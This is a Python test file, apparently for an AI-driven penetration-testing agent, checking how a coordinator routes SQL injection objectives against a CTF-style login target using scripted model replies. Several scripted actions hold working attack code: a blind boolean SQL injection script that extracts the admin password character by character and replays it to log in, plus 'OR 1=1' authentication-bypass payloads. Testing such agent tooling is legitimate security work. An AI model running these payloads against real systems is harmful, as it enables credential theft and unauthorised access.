    specialist_attempts = [
        attempt for attempt in engine.state.attempts if attempt["selected_action"] == specialist
    ]
    assert len(specialist_attempts) == 1

    replays = [json.loads(item) for item in engine.state.signals["sqli_replays"]]
    assert len(replays) == 1
    assert replays[0]["method"] == "POST"
    assert set(replays[0]["required_fields"]) == {
        "username",
        "password",
        "submit",
    }
    assert "success" not in replays[0]["required_fields"]

    events = [
        json.loads(line)
        for line in engine.workspace.events_path.read_text(encoding="utf-8").splitlines()
    ]
    kinds = [event["kind"] for event in events]
    assert kinds.count("frontier_request_contract_remembered") == 1
    assert kinds.count("frontier_contract_specialist_objective_queued") == 1
    assert kinds.count("frontier_contract_specialist_handoff_rejected") == 1
    assert kinds.count("frontier_contract_specialist_action_rejected") == TWO_REQUESTS
    assert kinds.index("frontier_observed_contract_handoff_rejected") < kinds.index(
        "frontier_request_contract_remembered"
    )
    rejected = [
        event["payload"]["code"]
        for event in events
        if event["kind"] == "frontier_contract_specialist_action_rejected"
    ]
    assert rejected == [
        "assigned_contract_specialist_required",
        "contract_specialist_already_attempted",
    ]


@pytest.mark.parametrize("replay_format", ["run26_markers", "run27_nested_json"])
def test_specialist_result_advances_to_rejected_stored_secret(
    tmp_path: Path,
    replay_format: str,
) -> None:
    state = AgentState(turn=BASE_REQUESTS, primitives={"sqli_confirmed": 6})
    remember_observed_request_contracts(
        state,
        """
        $.ajax({
          type: 'post',
          url: 'index.php',
          data: {username: username, password: password, submit: 'submit'},
          success: handleResponse
        });
        """,
        context=ContractRouteContext(
            target_url=TARGET_URL,
            family="sql_injection",
            objective_endpoint=TARGET_URL,
            objective_inputs=("username",),
        ),
    )
    contract = authoritative_replay_for_family(
        state,
        family="sql_injection",
        target_url=TARGET_URL,
        preferred_inputs=("username",),
    )
    assert contract is not None
    template = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint=contract.endpoint,
        inputs=(contract.payload_field,),
        payload_class="confirmed_primitive:sqli_confirmed:payload_semantics",
        expected_signal="continue the confirmed SQL route",
        evidence_refs=(contract.evidence_ref,),
    )
    objective = contract_specialist_objective(template, contract)
    specialist = {"action": "run_probe", "probe": "sqli_exploit"}
    extracted_value = "7d39307ae824e70052c0aa16816a9b16"
    extract_and_replay = {
        "action": "run_command",
        "command": (
            "python3 - <<'PY'\n"  # noqa: S608 - intentional SQLi regression payload.
            "import requests\n"
            f"url='{TARGET_URL}/index.php'\n"
            'true_body=\'{"response":"password"}\'\n'
            "password=''\n"
            "for position in range(1,33):\n"
            "  for code in range(32,127):\n"
            "    expr=f'ascii(substring((select password from users limit 0,1),"
            "{position},1))={code}'\n"
            '    payload=f"ravage\' OR ({expr})-- -"\n'
            "    data={'username':payload,'password':'x','submit':'submit'}\n"
            "    body=requests.post(url,data=data).text\n"
            "    if body == true_body:\n"
            "      password += chr(code)\n"
            "      print('PREFIX:'+password)\n"
            "      break\n"
            "print('PASSWORD='+password)\n"
            "login=requests.post(url,data={'username':'admin',"
            "'password':password,'submit':'submit'})\n"
            "print('LOGIN_BODY='+login.text)\n"
            "PY"
        ),
        "expected_signal": (
            "Extract the paired secret under the calibrated oracle, replay it once, "
            "and report the exact target login response."
        ),
    }

    def control(expr: str, body: str, digest: str) -> dict[str, object]:
        return {
            "phase": "boolean_probe",
            "expr": expr,
            "status": 200,
            "body_sha_hint": digest,
            "body_snippet": body,
            "method": "POST",
            "target": {
                "url": f"{TARGET_URL}/index.php",
                "input": "username",
                "method": "POST",
            },
        }

    true_body = '{"response":"password"}'
    false_body = '{"response":"username"}'
    specialist_observation = json.dumps(
        {
            "ok": True,
            "probe": "sqli_exploit",
            "findings": [
                {
                    "type": "sql_boolean_primitive",
                    "phase": "boolean_probe",
                    "true_payload": "ravage' OR (1=1)-- -",
                    "false_payload": "ravage' OR (1=0)-- -",
                },
                {
                    "type": "sql_boolean_extraction_summary",
                    "phase": "boolean_extract",
                    "extracted": [
                        {
                            "table": "users",
                            "column": "username",
                            "row": 0,
                            "value": "admin",
                        }
                    ],
                    "proofs": [],
                    "login_attempts": [],
                    "auth_bypass_attempts": [],
                },
            ],
            "requests": [
                control("1=1", true_body, "true-digest"),
                control("1=0", false_body, "false-digest"),
                control("2=2", true_body, "true-digest"),
                control("2=1", false_body, "false-digest"),
            ],
        }
    )
    prior_obligation = closure_obligation_from_observation(
        specialist_observation,
        family="sql_injection",
    )
    assert prior_obligation is not None
    assert remember_auth_bypass_matrix_attempt(
        state,
        obligation=prior_obligation,
        action={
            "action": "run_python",
            "code": (
                "import requests\n"
                'for payload in ["admin\' OR 1=1-- -", "x\')) OR 1=1-- -"]:\n'
                "    requests.post('/index.php', data={'username':'admin', "
                "'password':payload, 'submit':'submit'})"
            ),
        },
        observation=(
            'AUTH_CASE[password]=bounded-payload\nLOGIN_RESPONSE={"response":"password"}\n'
        ),
    )
    replay_stdout = (
        f'PASSWORD={extracted_value}\nLOGIN_BODY={{"response":"password"}}\n'
        if replay_format == "run26_markers"
        else json.dumps(
            {
                "extracted": [
                    {
                        "table": "users",
                        "row": 0,
                        "column": "password",
                        "value": extracted_value,
                    }
                ],
                "login_replay": {
                    "username": "admin",
                    "password": extracted_value,
                    "body": '{"response":"password"}',
                    "final_url": f"{TARGET_URL}/index.php",
                    "headers": {"Set-Cookie": "PHPSESSID=fresh; path=/"},
                },
            },
            indent=2,
        )
    )
    replay_observation = json.dumps(
        {
            "command": ["python3", "extract-and-replay.py"],
            "exit_code": 0,
            "stdout": replay_stdout,
        }
    )
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(specialist)),
            FrontierModelReply(content=json.dumps(extract_and_replay)),
            FrontierModelReply(content='{"action":"final","summary":"stored value rejected"}'),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=specialist_observation,
                outcome="new_surface",
                evidence_source_kind="tool_run_probe",
                evidence_observation=specialist_observation,
            ),
            ActionResult(
                ok=True,
                observation=replay_observation,
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=replay_observation,
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        state=state,
        config=FrontierRouteConfig(
            max_model_requests=THREE_REQUESTS,
            scout_lease=THREE_REQUESTS,
            counterfactual_lease=THREE_REQUESTS,
            proof_lease=THREE_REQUESTS,
            max_workers=THREE_REQUESTS,
            repeated_observation_limit=THREE_REQUESTS,
            repeated_low_value_route_limit=THREE_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.REQUEST_BUDGET_EXHAUSTED
    assert [call["action"] for call in executor.calls] == [
        specialist,
        extract_and_replay,
    ]
    assert len(route.workers) == TWO_REQUESTS
    assert route.workers[1].role is FrontierWorkerRole.PROOF_CLOSURE
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_contract_specialist_action_rejected" not in events
    assert "frontier_extraction_checkpoint_remembered" in events
    assert "frontier_credential_replay_rejected" in events
    assert "frontier_closure_obligation_completed" in events
    assert events.count("frontier_closure_obligation_opened") == TWO_REQUESTS
    second_prompt = json.loads(model.calls[1][-1]["content"])
    assert any(
        "focused target-observed follow-up" in item.lower()
        for item in second_prompt["objective_constraints"]
    )
    assert (
        "password-side SQL authentication-bypass matrix"
        in second_prompt["coordinator_memory"]["pending_closure_obligation"]["required_transition"]
    )
    proof_prompt = json.loads(model.calls[2][-1]["content"])
    assert (
        proof_prompt["coordinator_memory"]["pending_closure_obligation"]["stage"]
        == "authenticated_transition"
    )
    assert (
        proof_prompt["coordinator_memory"]["rejected_credential_replays"][0]["representation_hint"]
        == "hash_shaped"
    )
    assert any(
        "fresh session cookie by itself is not authentication" in item.lower()
        for item in proof_prompt["objective_constraints"]
    )
    assert all(
        "first executable action" not in item.lower()
        for item in proof_prompt["objective_constraints"]
    )


def test_paired_secret_route_requires_auth_bypass_before_extraction(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:payload_semantics",
        expected_signal="advance the confirmed SQL authentication route",
    )
    obligation = closure_obligation_from_observation(
        json.dumps(
            {
                "findings": [
                    {
                        "type": "sql_boolean_extraction_summary",
                        "extracted": [
                            {
                                "table": "users",
                                "column": "username",
                                "row": 0,
                                "value": "admin",
                            }
                        ],
                        "proofs": [],
                        "login_attempts": [],
                        "auth_bypass_attempts": [],
                    }
                ]
            }
        ),
        family="sql_injection",
    )
    assert obligation is not None
    state = AgentState(turn=BASE_REQUESTS, primitives={"sqli_confirmed": 6})
    remember_observed_request_contracts(
        state,
        """
        $.ajax({
          type: 'post',
          url: 'index.php',
          data: {username: username, password: password, submit: 'submit'}
        });
        """,
        context=ContractRouteContext(
            target_url=TARGET_URL,
            family="sql_injection",
            objective_endpoint=TARGET_URL,
            objective_inputs=("username",),
        ),
    )
    remember_closure_obligation(state, obligation)
    extraction = {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "for position in range(1,33):\n"
            "    expr=f'ascii(substring((select password),{position},1))>64'\n"
            "    urllib.request.urlopen('/index.php?username=' + expr)\n"
            "    print(prefix)"
        ),
    }
    bypass = {
        "action": "run_python",
        "code": (
            "import requests\n"
            'payloads=["admin\' OR 1=1-- -", "x\')) OR 1=1-- -"]\n'
            "with requests.Session() as session:\n"
            "    for payload in payloads:\n"
            "        response=session.post('/index.php', data={'username':'admin', "
            "'password':payload, 'submit':'submit'})\n"
            "        protected=session.get('/dashboard.php')\n"
            "        print(response.text, protected.url)"
        ),
    }
    success = (
        'LOGIN_RESPONSE={"response":"Success"}\n'
        "POST_LOGIN_URL=/dashboard.php\n"
        "POST_LOGIN_TITLE=Dashboard\n"
    )
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(extraction)),
            FrontierModelReply(content=json.dumps(bypass)),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=success,
                outcome="new_surface",
                evidence_source_kind="tool_run_python",
                evidence_observation=success,
            )
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        state=state,
        config=FrontierRouteConfig(
            max_model_requests=TWO_REQUESTS,
            scout_lease=TWO_REQUESTS,
            counterfactual_lease=TWO_REQUESTS,
            proof_lease=TWO_REQUESTS,
            max_workers=TWO_REQUESTS,
            repeated_observation_limit=TWO_REQUESTS,
            repeated_low_value_route_limit=TWO_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.REQUEST_BUDGET_EXHAUSTED
    assert [call["action"] for call in executor.calls] == [bypass]
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_auth_transition_action_rejected" in events
    assert "frontier_auth_bypass_matrix_attempted" in events
    assert "frontier_closure_obligation_completed" in events


def test_repeated_closure_final_routes_once_instead_of_burning_worker_lease(
    tmp_path: Path,
) -> None:
    initial = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:payload_semantics",
        expected_signal="advance the confirmed SQL route",
    )
    obligation = closure_obligation_from_observation(
        json.dumps(
            {
                "findings": [
                    {
                        "type": "sql_boolean_extraction_summary",
                        "extracted": [
                            {
                                "table": "users",
                                "column": "username",
                                "row": 0,
                                "value": "admin",
                            }
                        ],
                        "proofs": [],
                        "login_attempts": [],
                        "auth_bypass_attempts": [],
                    }
                ]
            }
        ),
        family="sql_injection",
    )
    assert obligation is not None
    state = AgentState(turn=BASE_REQUESTS, primitives={"sqli_confirmed": 6})
    remember_closure_obligation(state, obligation)
    closure_action = {
        "action": "run_python",
        "code": (
            "import requests\n"
            "expr='select password from users limit 0,1'\n"
            "print(requests.post('/index.php', data={'username':expr}).text)"
        ),
    }
    proof = "flag{closure_route_proof}"
    model = ScriptedModel(
        [
            FrontierModelReply(content='{"action":"final","summary":"cannot continue"}'),
            FrontierModelReply(content='{"action":"final","summary":"still cannot continue"}'),
            FrontierModelReply(content=json.dumps(closure_action)),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_python",
                evidence_observation=proof,
            )
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial,),
        state=state,
        config=FrontierRouteConfig(
            max_model_requests=THREE_REQUESTS,
            scout_lease=THREE_REQUESTS,
            counterfactual_lease=THREE_REQUESTS,
            proof_lease=THREE_REQUESTS,
            max_workers=THREE_REQUESTS,
            repeated_observation_limit=THREE_REQUESTS,
            repeated_low_value_route_limit=THREE_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert len(route.workers) == TWO_REQUESTS
    assert "closure_paired_secret" in route.workers[1].objective.payload_class
    assert len(executor.calls) == 1
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert events.count("frontier_closure_obligation_handoff_rejected") == 1
    assert events.count("frontier_closure_obligation_worker_handoff") == 1


def test_same_closure_epoch_is_not_spawned_from_a_different_parent(
    tmp_path: Path,
) -> None:
    obligation = closure_obligation_from_observation(
        json.dumps(
            {
                "findings": [
                    {
                        "type": "sql_boolean_extraction_summary",
                        "extracted": [
                            {
                                "table": "users",
                                "column": "username",
                                "row": 0,
                                "value": "admin",
                            }
                        ],
                        "proofs": [],
                        "login_attempts": [],
                        "auth_bypass_attempts": [],
                    }
                ]
            }
        ),
        family="sql_injection",
    )
    assert obligation is not None
    first_parent = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:contract_specialist",
        expected_signal="run the contract specialist",
        evidence_refs=("replay-contract:contract",),
    )
    first_closure = closure_obligation_objective(first_parent, obligation)
    different_parent = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:payload_semantics",
        expected_signal="change payload semantics",
        evidence_refs=(
            "replay-contract:contract",
            "material:parent-specific-route-evidence",
        ),
    )
    config = FrontierRouteConfig(
        max_model_requests=THREE_REQUESTS,
        scout_lease=THREE_REQUESTS,
        counterfactual_lease=THREE_REQUESTS,
        proof_lease=THREE_REQUESTS,
        max_workers=THREE_REQUESTS,
        repeated_observation_limit=THREE_REQUESTS,
        repeated_low_value_route_limit=THREE_REQUESTS,
    )
    route = FrontierRoute.start(
        base=_base(),
        initial_objective=first_closure,
        scope=(TARGET_URL,),
        config=config,
    )
    route.spawn_counterfactual(different_parent)
    state = AgentState(turn=BASE_REQUESTS, primitives={"sqli_confirmed": 6})
    remember_closure_obligation(state, obligation)
    model = ScriptedModel(
        [
            FrontierModelReply(content='{"action":"final","summary":"handoff"}'),
            FrontierModelReply(content='{"action":"final","summary":"still blocked"}'),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(different_parent,),
        state=state,
        route=route,
    )

    result = engine.run()

    assert result.status is FrontierRouteStatus.FRONTIER_EXHAUSTED
    assert len(result.workers) == TWO_REQUESTS
    assert (
        sum("closure_paired_secret" in worker.objective.payload_class for worker in result.workers)
        == 1
    )
    events = [
        json.loads(line)
        for line in engine.workspace.events_path.read_text(encoding="utf-8").splitlines()
    ]
    handoffs = [
        event for event in events if event["kind"] == "frontier_closure_obligation_worker_handoff"
    ]
    assert len(handoffs) == 1
    assert handoffs[0]["payload"]["closure_objective_fingerprint"] == ""


def test_evidence_revisits_advance_contract_to_oracle_to_proof_once(
    tmp_path: Path,
) -> None:
    state = AgentState(turn=BASE_REQUESTS, primitives={"sqli_confirmed": 6})
    remember_observed_request_contracts(
        state,
        """
        $.ajax({
          type: 'post',
          url: 'index.php',
          data: {username: username, password: password, submit: 'submit'},
          success: handleResponse
        });
        """,
        context=ContractRouteContext(
            target_url=TARGET_URL,
            family="sql_injection",
            objective_endpoint=TARGET_URL,
            objective_inputs=("username",),
        ),
    )
    contract = authoritative_replay_for_family(
        state,
        family="sql_injection",
        target_url=TARGET_URL,
        preferred_inputs=("username",),
    )
    assert contract is not None
    initial = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint=contract.endpoint,
        inputs=(contract.payload_field,),
        payload_class="confirmed_primitive:sqli_confirmed:payload_semantics",
        expected_signal=(
            "finish the seeded SQL payload stage" + replay_contract_expected_clause(contract)
        ),
        evidence_refs=(contract.evidence_ref,),
    )
    initial_action = {
        "action": "run_python",
        "code": (
            'payload="x\' OR 1=1-- -"\n'
            "data={'username': payload, 'password': '', 'submit': 'submit'}\n"
            f"print(requests.post('{TARGET_URL}/index.php', data=data).text)"
        ),
    }
    calibration_action = {
        "action": "run_python",
        "code": (
            "controls=('1=1','1=0','2=2','2=1')\n"
            f"url='{TARGET_URL}/index.php'\n"
            "records=[]\n"
            "for repetition in range(2):\n"
            "  for expr in controls:\n"
            '    payload=f"x\' OR ({expr})-- -"\n'
            "    data={'username': payload, 'password': '', 'submit': 'submit'}\n"
            "    response=requests.post(url, data=data)\n"
            "    records.append({'phase':'boolean_probe','expr':expr,"
            "'status':response.status_code,'body_snippet':response.text[:2000],"
            "'method':'POST','target':{'url':url,'input':'username',"
            "'method':'POST'}})\n"
            "print(json.dumps({'requests':records}))"
        ),
    }
    one_off_proof_action = {
        "action": "run_python",
        "code": (
            "expr='ascii(substring((select password from users limit 1),1,1))>64'\n"  # noqa: S608 - intentional SQLi regression payload.
            "payload=f'1 OR ({expr})'\n"
            "data={'username': payload, 'password': '', 'submit': 'submit'}\n"
            f"print(requests.post('{TARGET_URL}/index.php', data=data).text)"
        ),
    }
    proof_action = {
        "action": "run_python",
        "code": (
            "prefix=''\n"  # noqa: S608 - intentional SQLi regression payload.
            "for position in range(1, 5):\n"
            "  for candidate in string.printable:\n"
            '    expr=f"ascii(substring((select password from users limit 1),'
            '{position},1))={ord(candidate)}"\n'
            "    payload=f'1 OR ({expr})'\n"
            "    data={'username': payload, 'password': '', 'submit': 'submit'}\n"
            f"    body=requests.post('{TARGET_URL}/index.php', data=data).text\n"
            "    if body == TRUE_BODY:\n"
            "      prefix += candidate\n"
            "      print('checkpoint', prefix)\n"
            "      break"
        ),
    }

    def control_request(expr: str, body: str, digest: str) -> dict[str, object]:
        return {
            "phase": "boolean_probe",
            "expr": expr,
            "status": 200,
            "body_sha_hint": digest,
            "body_snippet": body,
            "method": "POST",
            "target": {
                "url": f"{TARGET_URL}/index.php",
                "input": "username",
                "method": "POST",
            },
        }

    true_body = '{"response":"password"}'
    false_body = '{"response":"username"}'
    oracle_observation = json.dumps(
        {
            "requests": [
                control_request("1=1", true_body, "true-digest"),
                control_request("1=0", false_body, "false-digest"),
                control_request("2=2", true_body, "true-digest"),
                control_request("2=1", false_body, "false-digest"),
            ]
        }
    )
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(initial_action)),
            FrontierModelReply(content='{"action":"final","summary":"seeded SQL stage complete"}'),
            FrontierModelReply(content='{"action":"final","summary":"skip calibration"}'),
            FrontierModelReply(content=json.dumps(calibration_action)),
            FrontierModelReply(content='{"action":"final","summary":"oracle persisted"}'),
            FrontierModelReply(content=json.dumps(one_off_proof_action)),
            FrontierModelReply(content='{"action":"final","summary":"one predicate is enough"}'),
            FrontierModelReply(content=json.dumps(proof_action)),
            FrontierModelReply(content='{"action":"final","summary":"bounded proof attempted"}'),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation="seeded SQL payload produced no proof",
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation="seeded SQL payload produced no proof",
            ),
            ActionResult(
                ok=True,
                observation=oracle_observation,
                outcome="confirmed_signal",
                evidence_source_kind="tool_run_python",
                evidence_observation=oracle_observation,
            ),
            ActionResult(
                ok=True,
                observation="one SQL predicate produced no proof",
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation="one SQL predicate produced no proof",
            ),
            ActionResult(
                ok=True,
                observation="bounded extractor completed without target proof",
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=("bounded extractor completed without target proof"),
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial,),
        state=state,
        config=FrontierRouteConfig(
            max_model_requests=TEN_REQUESTS,
            scout_lease=TWO_REQUESTS,
            counterfactual_lease=FOUR_REQUESTS,
            proof_lease=FOUR_REQUESTS,
            max_workers=FOUR_REQUESTS,
            repeated_observation_limit=TEN_REQUESTS,
            repeated_low_value_route_limit=TEN_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.FRONTIER_EXHAUSTED
    assert route.last_reason == "explicit_handoff_without_novel_objective"
    assert route.model_requests_started == NINE_REQUESTS
    assert route.remaining_model_requests == 1
    assert len(route.workers) == THREE_REQUESTS
    assert "evidence_revisit_contract_" in route.workers[1].objective.payload_class
    assert "evidence_revisit_oracle_" in route.workers[2].objective.payload_class
    assert route.workers[2].objective.payload_class.endswith(":proof_channel")
    assert [call["action"] for call in executor.calls] == [
        initial_action,
        calibration_action,
        one_off_proof_action,
        proof_action,
    ]
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert events.count("frontier_evidence_revisit_offered") == TWO_REQUESTS
    assert events.count("frontier_evidence_revisit_handoff_rejected") == 1
    assert events.count("frontier_bounded_proof_work_handoff_rejected") == 1
    assert "frontier_sql_oracle_remembered" in events
    assert "COORDINATOR_EVIDENCE_REVISIT_HANDOFF_GUARD" in json.dumps(model.calls[3])
    assert "COORDINATOR_BOUNDED_PROOF_WORK_GATE" in json.dumps(model.calls[7])
    proof_prompt = json.loads(model.calls[5][-1]["content"])
    assert proof_prompt["coordinator_memory"]["sql_oracle_contracts"]


def test_resume_skips_completed_request_stage_after_contract_rebase(
    tmp_path: Path,
) -> None:
    candidate_state = AgentState(
        signals={
            "sqli_replays": [
                json.dumps(
                    {
                        "method": "GET",
                        "payload_field": "username",
                        "source": "replay",
                        "url": f"{TARGET_URL}/?username=x",
                    }
                )
            ]
        }
    )
    candidate = authoritative_replay_for_family(
        candidate_state,
        family="sql_injection",
        target_url=TARGET_URL,
    )
    assert candidate is not None
    active_request = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint=candidate.endpoint,
        inputs=(candidate.payload_field,),
        payload_class="confirmed_primitive:sqli_confirmed:request_contract",
        expected_signal=(
            "observe the exact request contract" + replay_contract_expected_clause(candidate)
        ),
        evidence_refs=(candidate.evidence_ref,),
    )

    state = AgentState(turn=BASE_REQUESTS)
    ajax_contract = """
    $.ajax({
      type: 'post',
      url: 'index.php',
      data: {username: username, password: password, submit: 'submit'}
    });
    """
    remember_observed_request_contracts(
        state,
        ajax_contract,
        context=ContractRouteContext(
            target_url=TARGET_URL,
            family="sql_injection",
            objective_endpoint=TARGET_URL,
            objective_inputs=("username",),
        ),
    )
    observed = authoritative_replay_for_family(
        state,
        family="sql_injection",
        target_url=TARGET_URL,
    )
    assert observed is not None
    rebased_request = rebase_frontier_objective(active_request, observed)
    payload = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint=candidate.endpoint,
        inputs=(candidate.payload_field,),
        payload_class="confirmed_primitive:sqli_confirmed:payload_semantics",
        expected_signal=(
            "calibrate payload semantics" + replay_contract_expected_clause(candidate)
        ),
        evidence_refs=(candidate.evidence_ref,),
    )
    rebased_payload = rebase_frontier_objective(payload, observed)
    fetch = {
        "action": "run_python",
        "code": (f"url='{TARGET_URL}/?username=contract'\nprint(requests.get(url).text)"),
    }
    post_payload = {
        "action": "run_python",
        "code": (
            'payload="x\' OR 1=1-- -"\n'
            f"requests.post('{TARGET_URL}/index.php', data={{"
            "'username': payload, 'password': '', 'submit': 'submit'})"
        ),
    }
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(fetch)),
            FrontierModelReply(content='{"action":"final","summary":"contract already persisted"}'),
            FrontierModelReply(content=json.dumps(post_payload)),
        ]
    )
    route = FrontierRoute.start(
        base=_base(),
        initial_objective=active_request,
        scope=(TARGET_URL,),
        config=FrontierRouteConfig(
            max_model_requests=THREE_REQUESTS,
            scout_lease=THREE_REQUESTS,
            counterfactual_lease=THREE_REQUESTS,
            proof_lease=THREE_REQUESTS,
            max_workers=THREE_REQUESTS,
            repeated_observation_limit=THREE_REQUESTS,
            repeated_low_value_route_limit=THREE_REQUESTS,
        ),
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor(
            [
                ActionResult(
                    ok=True,
                    observation="target page fetched",
                    outcome="observed",
                    evidence_source_kind="tool_run_python",
                    evidence_observation="target page fetched",
                ),
                ActionResult(
                    ok=True,
                    observation="POST controls completed without proof",
                    outcome="observed",
                    evidence_source_kind="tool_run_python",
                    evidence_observation="POST controls completed without proof",
                ),
            ]
        ),
        objectives=(rebased_request, rebased_payload),
        route=route,
        state=state,
    )

    finished = engine.run()

    assert finished.status is FrontierRouteStatus.REQUEST_BUDGET_EXHAUSTED
    assert len(finished.workers) == TWO_REQUESTS
    assert finished.workers[1].objective.payload_class.endswith("payload_semantics")
    third_prompt = json.loads(model.calls[2][-1]["content"])
    assert third_prompt["assignment"]["payload_class"].endswith("payload_semantics")
    assert third_prompt["assignment"]["endpoint"] == f"{TARGET_URL}/index.php"


def test_contract_memory_crosses_worker_handoff_and_partial_sql_data_forces_focus(
    tmp_path: Path,
) -> None:
    initial = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/session/login.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:request_contract",
        expected_signal="preserve the target-defined login request contract",
        evidence_refs=("primitive:sqli_confirmed:turn:6",),
    )
    first_action = {
        "action": "run_python",
        "code": (
            "html=urllib.request.urlopen(base+'/session/login.php').read()\n"
            "data=urllib.parse.urlencode({'username': user, 'password': password})\n"
            "urllib.request.Request(base+'/session/login.php', data=data, method='POST')"
        ),
    }
    ajax_contract = """
    $.ajax({
      type: 'post',
      url: 'session/login.php',
      data: {username: username, password: password, submit: 'submit'}
    });
    """
    wrapped_ajax_contract = json.dumps(
        {
            "ok": True,
            "probe": "sqli_exploit",
            "findings": [
                {
                    "type": "blind_sql_injection_boolean_signal",
                    "replay": {
                        "method": "POST",
                        "url": "/session/login.php",
                        "payload_field": "username",
                        "form": {
                            "username": "",
                            "password": "",
                            "submit": "submit",
                        },
                    },
                }
            ],
            "stdout": ajax_contract,
        }
    )
    partial_extraction = json.dumps(
        {
            "ok": True,
            "probe": "sqli_exploit",
            "findings": [
                {
                    "type": "sql_boolean_extraction_summary",
                    "extracted": [
                        {
                            "table": "accounts",
                            "column": "username",
                            "row": 0,
                            "value": "admin",
                        }
                    ],
                    "proofs": [],
                    "login_attempts": [],
                    "auth_bypass_attempts": [],
                }
            ],
        }
    )
    focused_action = {
        "action": "run_python",
        "code": (
            "# Continue the existing HTTP oracle without schema enumeration.\n"
            "expr='select password from accounts limit 1'\n"
            "urllib.request.urlopen(request)"
        ),
    }
    proof_action = {
        "action": "run_python",
        "code": (
            "# Complete the still-open paired-secret obligation.\n"
            "expr='select password from accounts limit 1'\n"
            "data=urllib.parse.urlencode({'username': user, "
            "'password': extracted_password, 'submit': 'submit'})\n"
            "request=urllib.request.Request(base+'/session/login.php', "
            "data=data, method='POST')\n"
            "urllib.request.urlopen(request)"
        ),
    }
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(first_action)),
            FrontierModelReply(
                content=json.dumps({"action": "run_probe", "probe": "sqli_exploit"})
            ),
            FrontierModelReply(content='{"action":"final","summary":"username extracted"}'),
            FrontierModelReply(content=json.dumps(focused_action)),
            FrontierModelReply(content='{"action":"final","summary":"focused route attempted"}'),
            FrontierModelReply(content=json.dumps(proof_action)),
        ]
    )
    proof = "flag{closure_required_after_failed_extractor}"
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=wrapped_ajax_contract,
                outcome="confirmed_signal",
                evidence_source_kind="tool_run_probe",
                evidence_observation=wrapped_ajax_contract,
            ),
            ActionResult(
                ok=True,
                observation=partial_extraction,
                outcome="confirmed_signal",
                evidence_source_kind="tool_run_probe",
                evidence_observation=partial_extraction,
            ),
            ActionResult(
                ok=True,
                observation="focused paired-secret extraction produced no new value",
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=("focused paired-secret extraction produced no new value"),
            ),
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_python",
                evidence_observation=proof,
            ),
        ]
    )
    stale_replay = json.dumps(
        {
            "method": "GET",
            "url": f"{TARGET_URL}/?username=admin%27--",
            "payload_field": "username",
        },
        sort_keys=True,
    )
    partial_obligation = closure_obligation_from_observation(
        partial_extraction,
        family="sql_injection",
    )
    assert partial_obligation is not None
    state = AgentState(
        turn=BASE_REQUESTS,
        signals={"sqli_replays": [stale_replay]},
    )
    assert remember_auth_bypass_matrix_attempt(
        state,
        obligation=partial_obligation,
        action={
            "action": "run_python",
            "code": (
                "import requests\n"
                'for payload in ["admin\' OR 1=1-- -", "x\')) OR 1=1-- -"]:\n'
                "    requests.post('/session/login.php', "
                "data={'username':'admin', 'password':payload})"
            ),
        },
        observation=(
            'AUTH_CASE[password]=bounded-payload\nLOGIN_RESPONSE={"response":"password"}\n'
        ),
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial,),
        state=state,
        config=FrontierRouteConfig(
            max_model_requests=8,
            scout_lease=4,
